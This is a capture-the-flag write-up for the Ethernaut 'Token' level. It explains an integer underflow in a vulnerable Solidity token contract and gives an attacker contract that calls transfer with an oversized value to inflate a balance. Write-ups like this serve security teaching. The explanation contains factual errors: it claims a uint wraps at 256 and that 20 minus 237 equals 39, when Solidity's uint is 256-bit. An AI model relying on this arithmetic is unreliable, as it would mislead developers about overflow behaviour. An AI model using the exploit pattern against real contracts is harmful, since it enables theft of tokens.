## Ethernaut Level 05 - Token - Write-Up
<!--Authors: OofedUp-->

Difficulty: 3/10

![image](https://i.imgur.com/dUleqJ9.png)

## Source
```javascript
pragma solidity ^0.4.18;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  function Token(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```

In this smart contract, the developer used normal operators to do math (`+`, `-`) which at first glance seems fine, but in Solidity, it's a huge vulnerability. That's why many contracts use the `SafeMath` library.

## Unsigned Integer Underflow

In Solidity, uint8 types (unsigned 8 bit integers)
behave in a weird way because of how they are stored in memory (you can read more about it [here](https://randomoracle.wordpress.com/2018/04/27/ethereum-solidity-and-integer-overflows-programming-blockchains-like-1970/)). This contract is vulnerable to such a underflow vulnerability here:

```javascript
require(balances[msg.sender] - _value >= 0);
```

Since `balances[msg.sender]` is a **uint** and its equal to `0`, if we subtract `1` from it, it will become `256`.

In this contract, we start off with 20 tokens, and we need to make that number bigger. For demonstration purposes, we will pass `237` (selected randomly) to the `transfer` function, and the `require(balances[msg.sender] - _value >= 0);` will pass because `20 - 237 = 256 - (237-20) = 39` which is `>= 0`. We need to create a new address/smart contract from which we will call this function, so that the tokens will not get subtracted as well at `require(balances[msg.sender] - _value >= 0)`.

This is the code that I used:

```javascript
pragma solidity ^0.4.18;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  function Token(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}

contract unsigned{
    Token main;

    function unsigned(){
        main = Token(INSTANCE ADDRESS);
    }

    function rotate() public{
        main.transfer(PLAYER ADDRESS, 237);
    }
}
```

We will have `20 + 237 = 257` tokens.

We can then check our balance and submit the contract:

![image](https://i.imgur.com/zeBmsLB.png)
